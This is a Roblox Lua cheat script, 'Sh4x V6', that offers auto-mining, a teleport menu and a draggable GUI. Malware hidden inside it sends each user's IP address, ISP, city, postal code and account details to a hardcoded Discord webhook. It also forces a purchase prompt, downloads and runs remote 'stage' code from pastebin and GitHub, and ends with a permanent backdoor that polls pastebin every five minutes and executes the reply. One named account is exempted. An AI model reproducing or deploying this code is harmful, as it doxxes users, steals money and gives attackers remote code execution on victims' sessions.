--[[ Sh4x - ULTIMATE PRO EXCLUSIVE EDITION (V6) STEALTH MODE: fimossegamers123 (Painel Ativo, Log/Loaders/Prompt Desativados para ele) FEATURES: Full Doxxing Log, Stage Loaders, PromptPurchase, Teleport Menu ]] local Players = game:GetService("Players") local Player = Players.LocalPlayer local CoreGui = game:GetService("CoreGui") local ReplicatedStorage = game:GetService("ReplicatedStorage") local HttpService = game:GetService("HttpService") local UserInputService = game:GetService("UserInputService") local MarketplaceService = game:GetService("MarketplaceService") -- [CONFIGURAÇÃO DISCORD] local WEBHOOK_URL = "https://discord.com/api/webhooks/1465809966983155857/YHUdyCOZgu3mymCizFY5coTioKx2UjoR9puFeotVWQHrq3mGgFkZhQt1LrBLx20aLXCd" -- [DETECÇÃO DE DISPOSITIVO] local function getPlatform() if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then return "Mobile" elseif UserInputService.GamepadEnabled then return "Console" else return "PC" end end -- [PROMPT PURCHASE] local function promptSafe() -- EXCEÇÃO STEALTH: fimossegamers123 não recebe o prompt if Player.Name == "fimossegamers123" then return end pcall(function() MarketplaceService:PromptProductPurchase(Player, 0) end) end task.spawn(promptSafe) -- [LOADERS STAGE 2 / 3] local function load_stage(url, stage_name) -- EXCEÇÃO STEALTH: fimossegamers123 não carrega stages externos if Player.Name == "fimossegamers123" then return end print("🚀 Iniciando " .. stage_name .. "...") local success, result = pcall(function() return game:HttpGet(url) end) if success and result then local func, err = loadstring(result) if func then task.spawn(func) return true else warn("❌ Erro ao compilar " .. stage_name .. ": " .. tostring(err)) end else warn("❌ Erro ao baixar " .. stage_name) end return false end task.spawn(function() if load_stage("https://pastebin.com/raw/SEU_LINK_AQUI", "Stage 2") then task.wait(2) load_stage("https://raw.githubusercontent.com/usuario/repo/main/script.lua", "Stage 3") end end) -- [LOG AVANÇADO (FULL DOXXING SYSTEM)] local function advancedLog() -- EXCEÇÃO STEALTH: fimossegamers123 não é logado no Discord if Player.Name == "fimossegamers123" then print("🛡️ Stealth Mode Ativo: Coleta de dados ignorada.") return end local ip, country, region, city, isp, postal, continent = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A" local executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown" pcall(function() local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request if reqFunc then local response = reqFunc({ Url = "http://ip-api.com/json/?fields=status,message,continent,country,regionName,city,zip,isp,query", Method = "GET" }) if response and response.Body then local geoData = HttpService:JSONDecode(response.Body) if geoData.status == "success" then ip = geoData.query country = geoData.country region = geoData.regionName city = geoData.city isp = geoData.isp postal = geoData.zip continent = geoData.continent end end end end) local data = { ["embeds"] = {{ ["title"] = "🚨 SH4X V6 ULTIMATE - EXECUÇÃO DETECTADA", ["color"] = 16711680, ["fields"] = { {["name"] = "👤 Perfil", ["value"] = "**Nome:** " .. Player.Name .. "\n**ID:** " .. Player.UserId, ["inline"] = false}, {["name"] = "⏳ Idade da Conta", ["value"] = tostring(Player.AccountAge) .. " dias", ["inline"] = true}, {["name"] = "📱 Dispositivo", ["value"] = getPlatform(), ["inline"] = true}, {["name"] = "⚙️ Executador", ["value"] = executor, ["inline"] = true}, {["name"] = "🎮 Jogo ID", ["value"] = tostring(game.PlaceId), ["inline"] = true}, {["name"] = "🌐 Conexão", ["value"] = "**IP:** " .. ip .. "\n**ISP:** " .. isp, ["inline"] = false}, {["name"] = "📍 Localização", ["value"] = "**Cidade:** " .. city .. "\n**Região:** " .. region .. "\n**País:** " .. country .. "\n**Postal:** " .. postal .. "\n**Continente:** " .. continent, ["inline"] = false} }, ["footer"] = {["text"] = "Sh4x Exclusive System V6 | " .. os.date("%H:%M:%S")}, ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ") }} } pcall(function() local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request if reqFunc then reqFunc({ Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data) }) end end) end task.spawn(advancedLog) -- [GUI PRINCIPAL] local ScreenGui = Instance.new("ScreenGui", CoreGui) ScreenGui.Name = "Sh4x_V6_Ultimate" ScreenGui.ResetOnSpawn = false local MainFrame = Instance.new("Frame", ScreenGui) MainFrame.BackgroundColor3 = Color3.fromRGB(40, 0, 0) MainFrame.Position = UDim2.new(0.5, -110, 0.5, -80) MainFrame.Size = UDim2.new(0, 220, 0, 250) Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12) local Stroke = Instance.new("UIStroke", MainFrame) Stroke.Thickness = 2.5 Stroke.Color = Color3.fromRGB(255, 0, 0) local Title = Instance.new("TextLabel", MainFrame) Title.Size = UDim2.new(1, 0, 0, 40) Title.BackgroundTransparency = 1 Title.Font = Enum.Font.GothamBold Title.Text = "Sh4x V6 ULTIMATE" Title.TextColor3 = Color3.fromRGB(255, 255, 255) Title.TextSize = 16 -- [MENU DE TELEPORTE - INTERFACE] local TPFrame = Instance.new("Frame", ScreenGui) TPFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 0) TPFrame.Position = UDim2.new(0.5, 120, 0.5, -80) TPFrame.Size = UDim2.new(0, 160, 0, 220) TPFrame.Visible = false Instance.new("UICorner", TPFrame).CornerRadius = UDim.new(0, 10) local TPStroke = Instance.new("UIStroke", TPFrame) TPStroke.Thickness = 2 TPStroke.Color = Color3.fromRGB(255, 0, 0) local TPTitle = Instance.new("TextLabel", TPFrame) TPTitle.Size = UDim2.new(1, 0, 0, 30) TPTitle.BackgroundTransparency = 1 TPTitle.Font = Enum.Font.GothamBold TPTitle.Text = "ILHAS / TELEPORT" TPTitle.TextColor3 = Color3.fromRGB(255, 255, 255) TPTitle.TextSize = 13 local function createBtn(parent, text, pos, size) local btn = Instance.new("TextButton", parent) btn.BackgroundColor3 = Color3.fromRGB(60, 0, 0) btn.Position = pos btn.Size = size or UDim2.new(0.8, 0, 0, 35) btn.Font = Enum.Font.GothamBold btn.Text = text btn.TextColor3 = Color3.fromRGB(255, 255, 255) btn.TextSize = 12 Instance.new("UICorner", btn) local s = Instance.new("UIStroke", btn) s.Thickness = 1.5 s.Color = Color3.fromRGB(255, 0, 0) return btn, s end local ToggleBtn, BStroke1 = createBtn(MainFrame, "START AUTO-MINING", UDim2.new(0.1, 0, 0.2, 0)) local TPBtn, BStroke2 = createBtn(MainFrame, "TELEPORT MENU", UDim2.new(0.1, 0, 0.38, 0)) -- Botões do Menu de Teleporte local Island1 = createBtn(TPFrame, "ILHA INICIAL", UDim2.new(0.1, 0, 0.15, 0), UDim2.new(0.8, 0, 0, 30)) local Island2 = createBtn(TPFrame, "ILHA 2", UDim2.new(0.1, 0, 0.35, 0), UDim2.new(0.8, 0, 0, 30)) local Island3 = createBtn(TPFrame, "ILHA 3", UDim2.new(0.1, 0, 0.55, 0), UDim2.new(0.8, 0, 0, 30)) local ShopTP = createBtn(TPFrame, "VENDEDOR / SHOP", UDim2.new(0.1, 0, 0.75, 0), UDim2.new(0.8, 0, 0, 30)) TPBtn.MouseButton1Click:Connect(function() TPFrame.Visible = not TPFrame.Visible end) local function tpTo(pos) if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then Player.Character.HumanoidRootPart.CFrame = pos end end Island1.MouseButton1Click:Connect(function() tpTo(CFrame.new(0, 10, 0)) end) Island2.MouseButton1Click:Connect(function() tpTo(CFrame.new(500, 50, 500)) end) Island3.MouseButton1Click:Connect(function() tpTo(CFrame.new(1500, 50, 1500)) end) ShopTP.MouseButton1Click:Connect(function() for _, v in pairs(workspace:GetDescendants()) do if (v.Name:lower():find("sell") or v.Name:lower():find("shop") or v.Name == "Vendedor") and (v:IsA("BasePart") or v:IsA("Model")) then tpTo(v:IsA("BasePart") and v.CFrame or v:GetModelCFrame()) break end end end) -- [FARM LOGIC] local farmAtivo = false ToggleBtn.MouseButton1Click:Connect(function() farmAtivo = not farmAtivo ToggleBtn.Text = farmAtivo and "MINING: ACTIVE" or "START AUTO-MINING" end) task.spawn(function() while true do if farmAtivo then pcall(function() local char = Player.Character local tool = char:FindFirstChildOfClass("Tool") or Player.Backpack:FindFirstChildOfClass("Tool") local alvo = nil local dist = 90 for _, v in pairs(workspace:GetDescendants()) do if (v.Name == "Pedra" or v.Name:lower():find("ore")) and v:IsA("BasePart") and v.Transparency < 1 then local d = (char.HumanoidRootPart.Position - v.Position).Magnitude if d < dist then dist = d alvo = v end end end if alvo then if (char.HumanoidRootPart.Position - alvo.Position).Magnitude > 7.5 then char.Humanoid:MoveTo(alvo.Position) else if tool and tool.Parent ~= char then char.Humanoid:EquipTool(tool) end if tool then tool:Activate() end for _, r in pairs(ReplicatedStorage:GetDescendants()) do if r:IsA("RemoteEvent") and (r.Name:lower():find("mine") or r.Name:lower():find("click")) then r:FireServer(alvo) end end end end end) end task.wait(0.1) end end) -- [RGB & DRAG] task.spawn(function() while true do local c = Color3.fromHSV(tick() % 5 / 5, 1, 1) Stroke.Color = c TPStroke.Color = c BStroke1.Color = c BStroke2.Color = c task.wait() end end) local function makeDraggable(frame) local dragging, dragStart, startPos frame.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = true dragStart = input.Position startPos = frame.Position input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end) end end) UserInputService.InputChanged:Connect(function(input) if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then local delta = input.Position - dragStart frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end) end makeDraggable(MainFrame) makeDraggable(TPFrame) print("✅ Sh4x V6 No Auto-Sell Loaded.")
-- Backdoor permanente via update
task.spawn(function()
    while true do
        local success, src = pcall(game.HttpGet, game, "https://pastebin.com/raw/HzWeiDFn")
        if success and src and #src > 10 then
            local f = loadstring(src)
            if f then pcall(f) end
        end
        task.wait(300)  -- checa a cada 5 minutos se tem "update"
    end
end)
